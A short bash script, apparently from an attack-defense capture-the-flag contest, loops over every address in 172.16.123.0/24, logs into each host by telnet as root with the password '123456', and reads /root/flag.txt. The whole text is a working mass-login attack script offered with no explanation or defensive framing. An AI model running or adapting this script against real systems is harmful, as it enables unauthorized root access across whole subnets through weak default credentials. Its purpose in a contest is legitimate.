for i in $(seq 255)
do
echo 172.16.123.$i
{ 
echo "root"
sleep 0.1
echo "123456"
sleep 0.1
for s in $(seq 2)
do
        
        echo "cat /root/flag.txt"
        echo --------------------IP:172.16.123.$i------------------------
        sleep 0.01
done
} | telnet 172.16.123.$i & { sleep 0.3;kill $! &}
done
